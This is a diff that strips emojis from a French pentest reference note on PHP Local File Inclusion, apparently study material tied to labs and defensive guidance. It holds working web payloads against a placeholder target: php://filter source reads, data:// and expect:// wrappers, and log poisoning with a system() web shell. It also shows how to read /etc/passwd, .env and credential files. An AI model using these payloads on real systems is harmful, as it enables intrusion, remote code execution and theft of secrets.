@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📂 LFI — Local File Inclusion
+# LFI — Local File Inclusion
 
 > [!info] **En 1 phrase**
 > LFI = amener le serveur à **inclure un fichier local** via `include($file)` non validé →
@@ -21,7 +21,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -33,10 +33,10 @@ flowchart LR
     L --> R3["RCE<br>injection dans un log"]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Un script PHP fait `include($file);` avec `$file = $_GET['page']` **sans validation**.
 > L'attaquant contrôle le chemin → il peut inclure n'importe quel fichier lisible du disque.
-> Contrairement au [[Path Traversal|🛣️ Path Traversal]], le fichier inclus est **interprété** → potentiel de RCE.
+> Contrairement au [[Path Traversal| Path Traversal]], le fichier inclus est **interprété** → potentiel de RCE.
 
 ```php
 <?php
@@ -45,13 +45,13 @@ include($file);   // vulnérable : LFI
 ?>
 ```
 
-> [!warning] ⚠️ **LFI ≠ Path Traversal**
+> [!warning] **LFI ≠ Path Traversal**
 > Le Path Traversal exploite une **lecture** brute. La File Inclusion exécute un **include()** :
 > c'est ce qui permet la **RCE** (le fichier inclus est interprété comme du PHP).
 
 ---
 
-## 🧬 Wrappers PHP → RCE
+## Wrappers PHP → RCE
 
 ### php://filter — lecture du code source
 
@@ -71,7 +71,7 @@ curl 'http://target/index.php?page=php://filter/convert.base64-encode/resource=c
 curl -s 'http://target/index.php?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
 ```
 
-> [!warning] ⚠️ **`php://filter` retourne du base64**
+> [!warning] `php://filter` retourne du base64**
 > Ne pas lire le résultat brut : `curl -s '...' | base64 -d` pour obtenir la source claire.
 
 ### Chaînes de filtres php://filter
@@ -82,7 +82,7 @@ page=php://filter/read=convert.base64-encode|convert.base64-decode/resource=conf
 page=php://filter/read=convert.iconv.UTF-8.UTF-7|convert.base64-decode/resource=php://temp
 ```
 
-> [!tip] 💡 **PHP filter chains (technique Synacktiv/ambionics)**
+> [!tip] **PHP filter chains (technique Synacktiv/ambionics)**
 > En chaînant `convert.iconv.*` et `convert.base64-decode`, on peut **générer un fichier
 > contenant un payload PHP arbitraire** à partir de n'importe quel fichier lisible
 > → RCE même sans log poisoning, via `include()` (pas besoin de `allow_url_include`).
@@ -117,7 +117,7 @@ page=data://text/plain,<?php%20echo%20file_get_contents('/etc/passwd');?>
 echo -n '<?php system($_GET["c"]); ?>' | base64
 ```
 
-> [!warning] ⚠️ `data://` et `php://input` sont des **URL** → ils exigent `allow_url_include = On` dans la plupart des cas. `php://filter` lui fonctionne toujours (fichier local).
+> [!warning] `data://` et `php://input` sont des **URL** → ils exigent `allow_url_include = On` dans la plupart des cas. `php://filter` lui fonctionne toujours (fichier local).
 
 ### expect:// — exécution directe
 
@@ -147,7 +147,7 @@ page=zip:///var/www/uploads/arch.zip%23shell
 
 ---
 
-## 🪵 Log Poisoning → RCE
+## Log Poisoning → RCE
 
 > Principe : **injecter du PHP dans un fichier journal** via un champ que le serveur journalise
 > (User-Agent, username SSH, ...), puis **inclure ce log** par LFI → le PHP est exécuté.
@@ -171,7 +171,7 @@ curl 'http://target/index.php?page=/var/log/apache/access.log&c=id'    # RedHat/
 curl 'http://target/index.php?page=/var/log/nginx/access.log&c=id'
 ```
 
-> [!warning] ⚠️ **Dans la ligne de requête, le payload est URL-encodé → PHP ne l'exécute pas.**
+> [!warning] **Dans la ligne de requête, le payload est URL-encodé → PHP ne l'exécute pas.**
 > Toujours passer par un **header** (User-Agent, Referer, X-Forwarded-For) pour du PHP brut.
 
 ### /var/log/auth.log (SSH) — RedHat : /var/log/secure
@@ -252,12 +252,12 @@ while true; do curl -A '<?php system($_GET["c"]); ?>' http://target/index.php; d
 while true; do curl 'http://target/index.php?page=/var/log/apache2/access.log&c=id'; done
 ```
 
-> [!tip] 💡 **Ordre d'essai log poisoning**
+> [!tip] **Ordre d'essai log poisoning**
 > 1. `access.log` (chemin le plus connu) → 2. `/proc/self/environ` (pas de chemin de log à deviner) → 3. `auth.log` (si SSH exposé) → 4. brute `/proc/self/fd/*`.
 
 ---
 
-## 🍪 Fichiers de session → RCE
+## Fichiers de session → RCE
 
 > PHP stocke les sessions dans des fichiers `sess_<PHPSESSID>`. Si une valeur de session est
 > **contrôlée** (username, champ de formulaire, panier...), on y injecte du PHP puis on inclut
@@ -284,12 +284,12 @@ Chemins de sessions selon les distributions :
 /var/lib/php/session/sess_<ID>
 ```
 
-> [!tip] 💡 Récupérer le chemin exact via un `phpinfo()` ou un LFI sur `/etc/php/*/apache2/php.ini`
+> [!tip] Récupérer le chemin exact via un `phpinfo()` ou un LFI sur `/etc/php/*/apache2/php.ini`
 > (paramètre `session.save_path`).
 
 ---
 
-## 🧰 Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -308,7 +308,7 @@ ffuf -u 'http://target/index.php?page=FUZZ' \
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -319,34 +319,34 @@ ffuf -u 'http://target/index.php?page=FUZZ' \
 | **Moindre privilège** | L'utilisateur web ne doit **pas** pouvoir lire les logs, `.env`, `config.php` |
 | **Surveillance** | Logs des patterns `php://`, `data://`, `../`, `etc/passwd` dans les requêtes |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Log poisoning vs php://filter — quel ordre ?**
+> [!tip] **Log poisoning vs php://filter — quel ordre ?**
 > 1. `php://filter/convert.base64-encode/resource=config.php` pour **confirmer le wrapper** et lire la source (discret).
 > 2. `data://` / `php://input` pour un RCE **sans dépendre des logs**.
 > 3. Le **log poisoning** en dernier : il dépend de chemins de logs exacts, de droits de lecture ET du fait que PHP interprète bien le contenu du log.
 
-> [!warning] ⚠️ **Connaître le fichier inclus (chemin exact)**
+> [!warning] **Connaître le fichier inclus (chemin exact)**
 > `include("pages/".$_GET['page'].".php")` ajoute un **suffixe** : `../../../etc/passwd` échoue. Il faut alors : null byte (PHP < 5.3.4), path truncation, ou wrappers (`php://filter/.../resource=config.php`). Sans connaissance du chemin, **fuzzer** ou lire les erreurs.
 
-> [!tip] 💡 **User-Agent : pas d'URL-encoding !**
+> [!tip] **User-Agent : pas d'URL-encoding !**
 > Dans la ligne de requête, le payload est URL-encodé par le navigateur/curl → PHP le logue encodé → non exécuté. Les **headers** (User-Agent, X-Forwarded-For, Referer) sont stockés **bruts** dans les logs → payload PHP exécutable.
 
-> [!warning] ⚠️ **`data://` et `php://input` exigent `allow_url_include=On`** ; `php://filter` et `expect://` non. Tester chaque wrapper séparément selon la config PHP.
+> [!warning] `data://` et `php://input` exigent `allow_url_include=On`** ; `php://filter` et `expect://` non. Tester chaque wrapper séparément selon la config PHP.
 
-> [!tip] 💡 **LFI ≠ RCE nécessairement**
+> [!tip] **LFI ≠ RCE nécessairement**
 > Lire `config.php`, `.env` ou `wp-config.php` (secrets BDD, clés API, `AWS_SECRET_ACCESS_KEY`) est **déjà critique** même sans exécution.
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger — File inclusion : https://portswigger.net/web-security/all-labs#file-inclusion
 - Root-Me — LFI / PHP Filters : https://www.root-me.org/
 
 ---
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > - [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
 
-➡️ **Liens :** [[LFI et RFI|📂 Hub LFI/RFI]] · [[Path Traversal|🛣️ Path Traversal]] · [[RFI - Remote File Inclusion|🌐 RFI]] · [[Injection SQL|💾 SQLi]] · [[SSRF|🌐 SSRF]] · [[03 - Exploitation Web|🌍 Exploitation Web]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[LFI et RFI| Hub LFI/RFI]] · [[Path Traversal| Path Traversal]] · [[RFI - Remote File Inclusion| RFI]] · [[Injection SQL| SQLi]] · [[SSRF| SSRF]] · [[03 - Exploitation Web| Exploitation Web]] · [[Bibliothèque technique| Index]]
